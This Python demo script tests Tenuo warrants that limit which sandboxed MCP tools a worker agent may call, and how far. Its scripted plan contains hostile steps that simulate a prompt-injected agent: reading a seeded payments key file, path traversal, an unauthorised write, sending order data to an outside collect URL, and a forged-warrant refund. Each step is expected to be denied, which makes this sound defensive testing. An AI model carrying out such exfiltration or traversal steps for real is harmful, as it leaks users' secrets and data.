"""Scope access to sandbox-hosted MCP tools with Tenuo warrants, verified on both ends.

An E2B sandbox hosts three MCP servers. Two are stock servers behind E2B's MCP
gateway (filesystem, fetch). The third is the vault, a small server started
inside the sandbox from vault_server.py: it holds the refund capability and
verifies every call's warrant and proof of possession itself, against the
control plane's root key, before the tool body runs.

A local worker drives all three through Tenuo's MCP client, which checks the
same warrant before each call leaves the process and, for the vault, attaches
the warrant chain and a per-call signature so the server can check it again.
That second check is the point: a client that skips, forgets, or forges its
own check still cannot move money.

Three roles, three keys, no sharing:

- control plane: root key. Mints the task warrant, signs revocations, and is
  the only key the vault trusts.
- orchestrator: its own key. Creates the sandbox, starts the vault, grants the
  worker warrant.
- worker: its own identity, one warrant-stack string, and the root's public
  key. Receives no other principal's private key.

The worker's plan is scripted so the run is deterministic and needs no model
key. Several steps are deliberately hostile: they are what a prompt-injected
agent would try. Each scoped call must be denied before the tool runs, and a
separate section shows the vault refusing a client that bypassed the local
check entirely. The sandbox's egress allowlist is a host-level backstop
derived from the warrant's fetch host; a curl probe inside the sandbox checks
it directly.
"""

from __future__ import annotations

import asyncio
import hashlib
import logging
import os
import sys
from pathlib import Path
from typing import Any

from e2b import AsyncSandbox, CommandExitException
from policy import (
    DATA_DIR,
    ORDER_ID,
    VAULT_TOOL,
    WORKSPACE,
    ToolNames,
    egress_rules,
    grant_worker_warrant,
    mint_task_warrant,
    pack_for_worker,
    resolve_tool_names,
    revocation_list,
)
from tenuo import (
    ConfigurationError,
    Exact,
    HolderIdentity,
    Range,
    Runtime,
    SignedRevocationList,
    SigningKey,
    TenuoError,
    Warrant,
)
from tenuo.mcp import SecureMCPClient
from tenuo_core import verify_receipt

# In production: the root key lives in the control plane, the orchestrator key in
# its secret store, and the worker loads its identity with
# HolderIdentity.load_or_create(path). Generated per run here.
ROOT_KEY = SigningKey.generate()
ORCHESTRATOR_KEY = SigningKey.generate()
WORKER = HolderIdentity.generate()
INTERN = HolderIdentity.generate()  # an identity that was never granted anything
ATTACKER_ROOT = SigningKey.generate()  # a key that will mint a warrant nobody trusts

SANDBOX_TIMEOUT = 600  # seconds; the sandbox is killed in `finally` well before this
VAULT_DIR = "/home/user/vault"
VAULT_PORT = 8765
# Tenuo inside the sandbox. The vault needs the verifier and the MCP SDK; the
# E2B gateway template ships Python 3.8, so uv provides a 3.12 interpreter.
TENUO_SPEC = "tenuo[mcp]>=0.3.1,<0.4"

SEED_FILES = {
    f"{DATA_DIR}/orders.csv": "order_id,total\nA-100,240.00\nA-101,80.00\n",
    # Inside the filesystem server's allowed root, outside the worker's warrant.
    f"{WORKSPACE}/config/api_keys.txt": "PAYMENTS_KEY=sk_live_do_not_read\n",
}

# (label, which client, tool, args, "allow" | "deny")
Step = tuple[str, str, str, dict[str, Any], str]


def build_plan(tools: ToolNames) -> list[Step]:
    """What the worker proposes to do, in the shape an LLM's tool calls would take."""
    return [
        (
            "list the data directory",
            "gateway",
            tools.list_directory,
            {"path": DATA_DIR},
            "allow",
        ),
        (
            "read the orders file",
            "gateway",
            tools.read_file,
            {"path": f"{DATA_DIR}/orders.csv"},
            "allow",
        ),
        (
            "read the E2B docs home page",
            "gateway",
            tools.fetch,
            {"url": "https://docs.e2b.dev/"},
            "allow",
        ),
        (
            "refund 80 on the order, within the worker's limit",
            "vault",
            VAULT_TOOL,
            {"order_id": ORDER_ID, "amount": 80},
            "allow",
        ),
        (
            "pass an argument the warrant never mentions",
            "gateway",
            tools.fetch,
            {"url": "https://docs.e2b.dev/", "raw": True},
            "deny",
        ),
        (
            "read the payments key (in the server's root, outside the warrant)",
            "gateway",
            tools.read_file,
            {"path": f"{WORKSPACE}/config/api_keys.txt"},
            "deny",
        ),
        (
            "traverse out of the data directory",
            "gateway",
            tools.read_file,
            {"path": f"{DATA_DIR}/../config/api_keys.txt"},
            "deny",
        ),
        (
            "write a file (the worker was never granted writes)",
            "gateway",
            tools.write_file,
            {"path": f"{DATA_DIR}/notes.txt", "content": "hello"},
            "deny",
        ),
        (
            "post the orders to an outside host",
            "gateway",
            tools.fetch,
            {"url": "https://example.com/collect?orders=A-100"},
            "deny",
        ),
        (
            "refund 250, inside the task's limit but above the worker's",
            "vault",
            VAULT_TOOL,
            {"order_id": ORDER_ID, "amount": 250},
            "deny",
        ),
        (
            "refund a different order",
            "vault",
            VAULT_TOOL,
            {"order_id": "A-101", "amount": 20},
            "deny",
        ),
    ]


async def connect_with_retry(
    make_client, attempts: int = 8, delay: float = 3.0
) -> SecureMCPClient:
    """Servers come up a moment after they are started; retry the first connection."""
    client = make_client()
    for attempt in range(1, attempts + 1):
        try:
            await client.connect()
            return client
        except Exception:
            if attempt == attempts:
                raise
            await asyncio.sleep(delay)
    raise RuntimeError("unreachable")


async def start_vault(sandbox: AsyncSandbox, root_public_key_hex: str) -> str:
    """Install Tenuo inside the sandbox and start the vault. Returns its MCP URL.

    The vault trusts exactly one key, passed on its command line, and it is
    reached through the sandbox's own URL with the sandbox's traffic token, not
    through the MCP gateway: the gateway drops the request `_meta` that carries
    the warrant, and the vault must see it.
    """
    server_source = (Path(__file__).parent / "vault_server.py").read_text()
    await sandbox.files.write(f"{VAULT_DIR}/vault_server.py", server_source)
    setup = (
        f"set -e; cd {VAULT_DIR}; "
        "command -v uv >/dev/null 2>&1 || curl -LsSf https://astral.sh/uv/install.sh | sh >/dev/null 2>&1; "
        'export PATH="$HOME/.local/bin:$PATH"; '
        "uv venv --quiet --python 3.12 venv && "
        f"uv pip install --quiet --python venv/bin/python '{TENUO_SPEC}'"
    )
    await sandbox.commands.run(setup, timeout=300)
    await sandbox.commands.run(
        f"{VAULT_DIR}/venv/bin/python {VAULT_DIR}/vault_server.py "
        f"--trusted-root {root_public_key_hex} --port {VAULT_PORT} > {VAULT_DIR}/vault.log 2>&1",
        background=True,
    )
    return f"https://{sandbox.get_host(VAULT_PORT)}/mcp"


async def warm_up(client: SecureMCPClient, tools: ToolNames) -> None:
    """Start both gateway servers before egress is locked down.

    The gateway pulls each server's container image on its first tool call.
    That pull needs the open internet, so it has to happen before the sandbox
    is restricted to the hosts the warrant allows. These two calls are in scope
    and run without a warrant on purpose: nothing here is the worker acting yet.
    """
    await client.call_tool(
        tools.list_directory, {"path": DATA_DIR}, warrant_context=False, timeout=180
    )
    await client.call_tool(
        tools.fetch,
        {"url": "https://docs.e2b.dev/"},
        warrant_context=False,
        timeout=180,
    )


def outcome_of(exc: Exception) -> str:
    return f"{type(exc).__name__}: {str(exc).splitlines()[0][:96]}"


def report(
    expected: str, outcome: str, label: str, detail: str, failures: list[str]
) -> None:
    marker = "ok    " if outcome == expected else "WRONG "
    print(f"  {marker} {outcome.upper():5} {label}\n           {detail}")
    if outcome != expected:
        failures.append(f"{label}: expected {expected}, got {outcome}")


async def run_plan(
    clients: dict[str, SecureMCPClient], plan: list[Step], failures: list[str]
) -> None:
    """Execute each proposed call through the local warrant check inside the worker's session."""
    for label, which, tool, args, expected in plan:
        try:
            content = await clients[which].tools[tool](**args)
            preview = getattr(content[0], "text", str(content))[:70].replace("\n", " ")
            report(expected, "allow", label, preview, failures)
        except TenuoError as exc:
            report(expected, "deny", label, outcome_of(exc), failures)


async def vault_refuses(
    vault: SecureMCPClient,
    label: str,
    args: dict[str, Any],
    failures: list[str],
    **call_kwargs: Any,
) -> None:
    """Send a call straight to the vault with the local check off and expect the vault to refuse."""
    try:
        content = await vault.call_tool(
            VAULT_TOOL, args, warrant_context=False, **call_kwargs
        )
        report(
            "deny",
            "allow",
            label,
            getattr(content[0], "text", str(content))[:70],
            failures,
        )
    except Exception as exc:  # the vault's refusal arrives as an MCP tool error
        text = str(exc)
        outcome = "deny" if "vault refused" in text else "error"
        report(
            "deny", outcome, label, text.split("vault refused: ", 1)[-1][:96], failures
        )


async def probe_network_layer(sandbox: AsyncSandbox) -> tuple[bool, str]:
    """Verify allowed and denied egress directly from inside the sandbox.

    This bypasses Tenuo and the MCP gateway entirely. The allowed request
    proves the sandbox can still reach the host derived from the warrant; the
    denied request proves the catch-all network rule blocks another host.
    """
    try:
        await sandbox.commands.run(
            "curl -fsS --connect-timeout 10 --max-time 20 -o /dev/null https://docs.e2b.dev/",
            timeout=30,
        )
    except CommandExitException as exc:
        detail = exc.stderr.strip().splitlines()[-1:] or ["no stderr"]
        return False, f"allowed host failed: {' '.join(detail)}"
    try:
        await sandbox.commands.run(
            "curl -fsS --connect-timeout 10 --max-time 20 -o /dev/null https://example.com/",
            timeout=30,
        )
    except CommandExitException as exc:
        return (
            True,
            f"docs.e2b.dev reachable; example.com blocked (curl exit {exc.exit_code})",
        )
    return False, "example.com was reachable despite the egress policy"


def show_receipts(runtime: Runtime, expected_count: int, failures: list[str]) -> None:
    """Every worker-side authorization decision, as signed evidence.

    Receipts are signed by the worker's own key and hash-chained to each other,
    so a reviewer can verify who decided what, in what order, and under which
    warrant chain, without trusting the worker's logs.
    """
    receipts = runtime.drain_receipts()
    print(f"\nSigned receipts collected by the worker runtime: {len(receipts)}")
    if len(receipts) != expected_count:
        failures.append(
            f"expected {expected_count} authorization receipts, got {len(receipts)}"
        )
    signer = WORKER.public_key.to_bytes().hex()
    previous_wire = None
    for wire in receipts:
        payload = verify_receipt(wire)  # raises if the signature does not check out
        if payload.signer_key != signer:
            failures.append("receipt signed by an unexpected key")
        expected_previous = (
            None
            if previous_wire is None
            else hashlib.sha256(bytes.fromhex(previous_wire)).hexdigest()
        )
        if payload.prev_receipt_hash != expected_previous:
            failures.append("receipt chain link does not match the previous receipt")
        code = payload.decision_code or "-"
        chained = "chained" if payload.prev_receipt_hash else "first"
        print(f"  {payload.outcome:5} {payload.action:28} {code:22} {chained}")
        previous_wire = wire
    runtime.acknowledge_receipts(len(receipts))
    if not receipts:
        failures.append("no receipts were collected")


async def main() -> int:
    if not os.environ.get("E2B_API_KEY"):
        print("E2B_API_KEY is not set. Copy .env.example to .env and add your key.")
        return 2

    # The demo prints each expected check itself. In production keep this logger
    # at WARNING so denials also reach your log pipeline.
    logging.getLogger("tenuo").setLevel(logging.ERROR)
    # The MCP SDK's streamable-HTTP reader logs a traceback when a late SSE
    # message lands after the stream is closed at shutdown. Harmless here.
    logging.getLogger("mcp.client.streamable_http").setLevel(logging.CRITICAL)
    root_hex = ROOT_KEY.public_key.to_bytes().hex()

    failures: list[str] = []
    print("Creating an E2B sandbox with filesystem and fetch MCP servers...")
    sandbox = await AsyncSandbox.create(
        mcp={"filesystem": {"paths": [WORKSPACE]}, "fetch": {}},
        network={
            "allow_public_traffic": False
        },  # the vault's port needs the sandbox traffic token
        timeout=SANDBOX_TIMEOUT,
    )
    gateway = vault = None
    try:
        for path, body in SEED_FILES.items():
            await sandbox.files.write(path, body)

        print(
            "Installing Tenuo in the sandbox and starting the vault (trusts the root key only)..."
        )
        vault_url = await start_vault(sandbox, root_hex)

        # With public traffic off, every sandbox port (the gateway's included)
        # requires the sandbox's traffic token; the gateway also has its own.
        traffic = {"e2b-traffic-access-token": sandbox.traffic_access_token or ""}
        gateway_token = await sandbox.get_mcp_token()
        gateway = await connect_with_retry(
            lambda: SecureMCPClient(
                url=sandbox.get_mcp_url(),
                transport="http",
                headers={**traffic, "Authorization": f"Bearer {gateway_token}"},
            )
        )
        vault = await connect_with_retry(
            lambda: SecureMCPClient(
                url=vault_url,
                transport="http",
                headers=traffic,
                inject_warrant=True,  # send the warrant chain and a per-call signature to the vault
            )
        )
        tools = resolve_tool_names(gateway.tools)
        if VAULT_TOOL not in vault.tools:
            raise RuntimeError(
                f"vault does not advertise {VAULT_TOOL!r}: {sorted(vault.tools)}"
            )
        print(f"Gateway tools in use: {tools}")
        print(f"Vault tools: {sorted(vault.tools)}\n")

        # --- control plane: mint the task's whole authority for the orchestrator.
        task = mint_task_warrant(ROOT_KEY, ORCHESTRATOR_KEY.public_key, tools)
        print("Task warrant, minted by the control plane for the orchestrator:")
        print(f"  {task.capabilities}")

        # --- orchestrator: narrow it for the worker and ship one string.
        worker_warrant = grant_worker_warrant(
            task, ORCHESTRATOR_KEY, WORKER.public_key, tools
        )
        worker_stack = pack_for_worker(task, worker_warrant)
        print("Worker warrant, granted by the orchestrator, read-only and narrower:")
        print(f"  {worker_warrant.capabilities}")
        print(f"  shipped to the worker as one {len(worker_stack)}-char string\n")

        print("Starting the gateway's MCP servers (images are pulled on first use)...")
        await warm_up(gateway, tools)
        rules = egress_rules(worker_warrant, tools.fetch)
        print(f"Applying the sandbox's host-level egress backstop: {rules}\n")
        await sandbox.update_network(rules)

        # --- worker: only its identity and the string it was handed.
        runtime = Runtime(
            WORKER, trusted_roots=[ROOT_KEY.public_key], receipts="collect"
        )
        session = runtime.session_from_wire(worker_stack)
        clients = {"gateway": gateway, "vault": vault}

        plan = build_plan(tools)
        print(
            "Worker plan, each call checked against the worker warrant before it leaves the process:"
        )
        with runtime.session_scope(session):
            await run_plan(clients, plan, failures)

        print(
            "\nA compromised client skips its own check and talks to the vault directly:"
        )
        with runtime.session_scope(session):
            await vault_refuses(
                vault,
                "refund 250 with a valid warrant that does not cover it",
                {"order_id": ORDER_ID, "amount": 250},
                failures,
            )
        await vault_refuses(
            vault,
            "refund 20 with no warrant at all",
            {"order_id": ORDER_ID, "amount": 20},
            failures,
            inject_warrant=False,
        )
        forged = (
            Warrant.mint_builder()
            .capability(
                VAULT_TOOL, order_id=Exact(ORDER_ID), amount=Range.max_value(100_000)
            )
            .holder(WORKER.public_key)
            .ttl(300)
            .mint(ATTACKER_ROOT)
        )
        forged_runtime = Runtime(WORKER, trusted_roots=[ATTACKER_ROOT.public_key])
        with forged_runtime.session_scope(
            forged_runtime.session_from_wire(forged.to_base64())
        ):
            await vault_refuses(
                vault,
                "refund 20 under a warrant minted by an untrusted key",
                {"order_id": ORDER_ID, "amount": 20},
                failures,
            )

        print("\nAnother identity tries to use the worker's warrant string:")
        try:
            Runtime(INTERN, trusted_roots=[ROOT_KEY.public_key]).session_from_wire(
                worker_stack
            )
            report(
                "deny",
                "allow",
                "open a session with a borrowed warrant",
                "session opened",
                failures,
            )
        except ConfigurationError as exc:
            report(
                "deny",
                "deny",
                "open a session with a borrowed warrant",
                outcome_of(exc),
                failures,
            )

        print("\nThe control plane revokes the worker warrant mid-task:")
        srl = SignedRevocationList.from_bytes(
            revocation_list(ROOT_KEY, worker_warrant.id)
        )
        runtime.apply_revocation_list(
            srl
        )  # in production: fetched from the control plane
        with runtime.session_scope(session):
            try:
                await gateway.tools[tools.read_file](path=f"{DATA_DIR}/orders.csv")
                report(
                    "deny", "allow", "read after revocation", "read succeeded", failures
                )
            except TenuoError as exc:
                report(
                    "deny", "deny", "read after revocation", outcome_of(exc), failures
                )

        print("\nChecking the sandbox egress policy directly:")
        blocked, detail = await probe_network_layer(sandbox)
        print(f"  {'ok    ' if blocked else 'WRONG '} {detail}")
        if not blocked:
            failures.append(
                "network layer: expected egress to example.com to be blocked"
            )

        # One receipt per plan call, plus the post-revocation read. Calls that
        # skipped the local check on purpose produce no worker-side receipt.
        show_receipts(runtime, len(plan) + 1, failures)

        ledger = await vault.call_tool(
            "ledger", {}, warrant_context=False, inject_warrant=False
        )
        ledger_text = getattr(ledger[0], "text", str(ledger))
        print(f"\nVault ledger (what actually moved): {ledger_text}")
        if ledger_text.count("'order_id'") != 1:
            failures.append(
                f"vault ledger should hold exactly one refund, got: {ledger_text}"
            )
    finally:
        # Close in reverse connection order: the MCP transports hold anyio
        # cancel scopes, which must be exited last-in-first-out.
        for client in (vault, gateway):
            if client is not None:
                await client.close()
        print("\nKilling the sandbox...")
        await sandbox.kill()

    if failures:
        print("\nExpectations not met:")
        for item in failures:
            print(f"  - {item}")
        return 1
    print(
        "\nEvery out-of-scope call was denied by the worker's own check, and the vault refused "
        "every call that bypassed it. One refund moved, and it is the one the warrant allowed."
    )
    return 0


if __name__ == "__main__":
    sys.exit(asyncio.run(main()))
